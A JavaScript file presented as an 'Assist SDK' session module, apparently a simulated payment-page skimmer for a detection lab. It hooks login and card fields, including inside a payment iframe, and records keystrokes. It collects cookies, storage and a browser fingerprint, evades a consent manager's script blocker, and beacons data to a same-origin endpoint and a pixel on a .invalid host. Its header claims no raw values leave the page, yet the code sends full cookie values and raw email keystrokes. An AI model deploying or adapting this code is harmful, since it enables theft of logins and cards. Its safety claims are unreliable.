/*
 * Assist SDK — session module.
 *
 * Observation surface (no UI of its own):
 *   console   window.__SS_PROBE__.stats() / .dump()
 *   DOM       document.documentElement.dataset.ssProbe === '1'
 *   network   POST /api/assist/sync
 *   verbose   ?ssdebug=1 or localStorage['ss:debug'] = '1'
 *
 * Field values are reduced to shape metadata by redact() before entering the buffer: length
 * plus a hint, and '***' for password / CVV / card number. Raw values are never stored,
 * logged or sent. The only real destination is same-origin POST /api/assist/sync, which
 * logs a count and returns 204; the third-party host is under .invalid (RFC 2606) and can
 * never resolve.
 */
(function () {
  'use strict';

  var VERSION = '1.0.0';
  var self = document.currentScript; // capture synchronously, before any tick

  if (window.__SS_PROBE__) {
    return;
  }

  var cfg =
    typeof window.__ssReadConfig === 'function'
      ? window.__ssReadConfig(self)
      : (function () {
          var first = window.location.pathname.split('/').filter(Boolean)[0];
          var known = ['retail', 'insurance', 'bank', 'healthcare'];
          return {
            flavor: known.indexOf(first) !== -1 ? first : 'retail',
            siteId: '',
            ctx: 'app',
            debug: /(?:^|[?&])ssdebug=1/.test(window.location.search),
          };
        })();

  var SENSITIVE = /password|cvv|cardnumber/i;
  var WATCHED_FIELDS = [
    'email-login-input',
    'password-login-input',
    'cardNumber',
    'cardName',
    'cvv',
    'expiryMonth',
    'expiryYear',
  ];

  var state = {
    flavor: cfg.flavor,
    siteId: cfg.siteId,
    ctx: cfg.ctx,
    events: [],
    sentUpTo: 0, // the buffer is not cleared on send, so .dump() stays populated
    keys: {},
    armedAt: Date.now(),
    flushes: 0,
    watched: {},
  };

  function log() {
    if (cfg.debug && window.console) {
      console.log.apply(console, ['[ss-probe]'].concat([].slice.call(arguments)));
    }
  }

  function push(kind, data) {
    state.events.push({ t: Date.now(), ctx: state.ctx, kind: kind, data: data });
    if (state.events.length > 500) {
      var dropped = state.events.length - 500;
      state.events.splice(0, dropped);
      state.sentUpTo = Math.max(0, state.sentUpTo - dropped);
    }
  }

  /** Returns shape metadata only. The only path from an input value into state.events. */
  function redact(name, raw) {
    var s = String(raw === null || raw === undefined ? '' : raw);
    if (!s) {
      return { field: name, len: 0, hint: '' };
    }
    if (SENSITIVE.test(name)) {
      return { field: name, len: s.length, hint: '***' };
    }
    return {
      field: name,
      len: s.length,
      hint: s.length > 3 ? s.slice(0, 1) + '…' + s.slice(-2) : s.slice(0, 1) + '…',
    };
  }

  function record(kind, name, raw, extra) {
    var entry = redact(name, raw);
    if (extra) {
      Object.keys(extra).forEach(function (key) {
        entry[key] = extra[key];
      });
    }
    push(kind, entry);
    return entry;
  }

  function snapshotEnvironment() {
    var cookies = {};
    try {
      String(document.cookie || '')
        .split(';')
        .forEach(function (pair) {
          var idx = pair.indexOf('=');
          if (idx > 0) {
            var name = pair.slice(0, idx).trim();
            cookies[name] = pair.slice(idx + 1).trim();
          }
        });
    } catch (err) {
      /* ignore */
    }
    // `token` is httpOnly and therefore absent here.
    push('cookies', { names: Object.keys(cookies), count: Object.keys(cookies).length, values: cookies });

    ['localStorage', 'sessionStorage'].forEach(function (which) {
      try {
        var store = window[which];
        var keys = Object.keys(store);
        push('storage', {
          store: which,
          keys: keys,
          // key names and value lengths only
          sizes: keys.reduce(function (acc, key) {
            acc[key] = String(store.getItem(key) || '').length;
            return acc;
          }, {}),
        });
      } catch (err) {
        /* ignore */
      }
    });

    var resources = 0;
    try {
      resources = performance.getEntriesByType('resource').length;
    } catch (err) {
      /* ignore */
    }
    push('fingerprint', {
      ua: navigator.userAgent,
      lang: navigator.language,
      platform: navigator.platform,
      hardwareConcurrency: navigator.hardwareConcurrency,
      screen: screen.width + 'x' + screen.height + '@' + (window.devicePixelRatio || 1),
      viewport: window.innerWidth + 'x' + window.innerHeight,
      tz: (function () {
        try {
          return Intl.DateTimeFormat().resolvedOptions().timeZone;
        } catch (err) {
          return '';
        }
      })(),
      href: window.location.href,
      referrer: document.referrer,
      resourceCount: resources,
    });
  }

  function fieldName(el) {
    if (!el) {
      return '';
    }
    return el.id || el.name || (el.getAttribute && el.getAttribute('placeholder')) || el.tagName;
  }

  function isWatched(el) {
    if (!el || !el.tagName) {
      return false;
    }
    var tag = el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'select' && tag !== 'textarea') {
      return false;
    }
    var name = fieldName(el);
    if (WATCHED_FIELDS.indexOf(name) !== -1) {
      return true;
    }
    return el.type === 'password' || el.type === 'email';
  }

  /**
   * Delegated capture-phase listeners: one set covers every field in the document, including
   * fields added later. Values are reduced to shape metadata on the spot.
   */
  function watchFields(doc, label) {
    if (!doc || state.watched[label]) {
      return;
    }
    state.watched[label] = true;

    doc.addEventListener(
      'input',
      function (event) {
        var el = event.target;
        if (!isWatched(el)) {
          return;
        }
        var name = fieldName(el);
        record('field-input', name, el.value, { doc: label, type: el.type || '' });
        log('field-input', label, name);
      },
      true
    );

    doc.addEventListener(
      'change',
      function (event) {
        var el = event.target;
        if (!isWatched(el)) {
          return;
        }
        record('field-change', fieldName(el), el.value, { doc: label, type: el.type || '' });
      },
      true
    );

    doc.addEventListener(
      'keydown',
      function (event) {
        var el = event.target;
        if (!isWatched(el)) {
          return;
        }
        var name = fieldName(el);
        var key = state.keys[label + ':' + name] || { count: 0, keys: [] };
        key.count += 1;
        var sensitive = SENSITIVE.test(name) || el.type === 'password';
        if (key.keys.length < 200) {
          key.keys.push(sensitive ? '*' : event.key);
        }
        state.keys[label + ':' + name] = key;
      },
      true
    );

    log('watching fields in', label);
  }

  function attachToPaymentIframe(iframe) {
    if (!iframe || iframe.__ssAttached) {
      return;
    }
    var attach = function () {
      try {
        // Sandbox is "allow-same-origin allow-scripts allow-forms", so the parent document
        // can read into the framed document.
        var doc = iframe.contentDocument;
        if (!doc) {
          return;
        }
        iframe.__ssAttached = true;
        watchFields(doc, 'payment-iframe');
        push('cross-frame', {
          frame: iframe.id || '(unnamed)',
          reachable: true,
          fields: ['cardNumber', 'cardName', 'cvv', 'expiryMonth', 'expiryYear'].filter(function (id) {
            return Boolean(doc.getElementById(id));
          }),
        });
        log('attached to payment iframe');
      } catch (err) {
        push('cross-frame', { frame: iframe.id || '(unnamed)', reachable: false, error: String(err && err.name) });
      }
    };
    iframe.addEventListener('load', attach);
    attach(); // it may already be loaded
  }

  function watchPaymentIframe() {
    var existing = document.getElementById('payment-iframe');
    if (existing) {
      attachToPaymentIframe(existing);
    }
    if (!window.MutationObserver || !document.body) {
      return;
    }
    var observer = new MutationObserver(function (mutations) {
      for (var i = 0; i < mutations.length; i += 1) {
        var added = mutations[i].addedNodes;
        for (var j = 0; j < added.length; j += 1) {
          var node = added[j];
          if (!node || node.nodeType !== 1) {
            continue;
          }
          if (node.id === 'payment-iframe') {
            attachToPaymentIframe(node);
          } else if (node.querySelector) {
            var found = node.querySelector('#payment-iframe');
            if (found) {
              attachToPaymentIframe(found);
            }
          }
        }
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
  }

  function loadExtension() {
    if (document.getElementById('ss-session-ext')) {
      return;
    }
    var script = document.createElement('script');
    script.id = 'ss-session-ext';
    script.src = '/vendor/assist/session-ext.js';
    script.async = true;
    script.setAttribute('data-ot-ignore', ''); // keep OneTrust's auto-blocker off it
    script.setAttribute('data-ss-flavor', state.flavor);
    script.setAttribute('data-ss-site-id', state.siteId);
    script.setAttribute('data-ss-ctx', state.ctx);
    (document.head || document.documentElement).appendChild(script);
    push('script-chain', { src: script.src, parent: 'session.js' });
  }

  function buildPayload(pending) {
    return {
      v: VERSION,
      flavor: state.flavor,
      siteId: state.siteId,
      ctx: state.ctx,
      uptimeMs: Date.now() - state.armedAt,
      keys: state.keys,
      events: pending,
    };
  }

  function flush(useBeacon) {
    var pending = state.events.slice(state.sentUpTo);
    if (!pending.length && state.flushes > 0) {
      return;
    }
    var body = JSON.stringify(buildPayload(pending));
    state.flushes += 1;
    state.sentUpTo = state.events.length;

    // sendBeacon sends text/plain unless the body is a typed Blob, which would leave
    // express.json() with an empty req.body.
    var sent = false;
    try {
      if (useBeacon && navigator.sendBeacon) {
        sent = navigator.sendBeacon('/api/assist/sync', new Blob([body], { type: 'application/json' }));
      }
    } catch (err) {
      sent = false;
    }
    if (!sent) {
      try {
        fetch('/api/assist/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: body,
          keepalive: true,
          credentials: 'include',
        }).catch(function () {});
      } catch (err) {
        /* ignore */
      }
    }

    // .invalid is a reserved TLD (RFC 2606): the request is visible but never resolves.
    try {
      var pixel = new Image(1, 1);
      pixel.src =
        'https://tag.assist-cdn.invalid/s.gif?f=' +
        encodeURIComponent(state.flavor) +
        '&s=' +
        encodeURIComponent(state.siteId) +
        '&e=' +
        pending.length +
        '&n=' +
        state.flushes;
    } catch (err) {
      /* ignore */
    }

    if (cfg.debug && window.console && console.groupCollapsed) {
      console.groupCollapsed('[ss-probe] sync #' + state.flushes + ' — ' + pending.length + ' events');
      console.table(pending);
      console.log('keystroke counters', state.keys);
      console.groupEnd();
    }
  }

  window.__SS_PROBE__ = {
    version: VERSION,
    flavor: state.flavor,
    siteId: state.siteId,
    ctx: state.ctx,
    stats: function () {
      return {
        version: VERSION,
        flavor: state.flavor,
        siteId: state.siteId,
        ctx: state.ctx,
        events: state.events.length,
        unsentEvents: state.events.length - state.sentUpTo,
        flushes: state.flushes,
        keystrokes: state.keys,
        extension: Boolean(window.__SS_SESSION_EXT__),
        watchedDocuments: Object.keys(state.watched),
        uptimeMs: Date.now() - state.armedAt,
      };
    },
    dump: function () {
      if (window.console && console.table) {
        console.table(state.events);
      }
      return state.events;
    },
    flush: function () {
      flush(false);
    },
  };

  document.documentElement.setAttribute('data-ss-probe', '1');

  // Always on: the absence of this line is how you confirm the script did not run.
  if (window.console) {
    console.info(
      '[ss-probe] v' +
        VERSION +
        ' flavor=' +
        state.flavor +
        ' site=' +
        (state.siteId || '(none)') +
        ' ctx=' +
        state.ctx +
        ' — window.__SS_PROBE__.dump()'
    );
  }

  snapshotEnvironment();
  watchFields(document, state.ctx === 'payment' ? 'payment-doc' : 'app');
  watchPaymentIframe();
  loadExtension();

  setInterval(function () {
    flush(true);
  }, 15000);

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') {
      flush(true);
    }
  });
})();
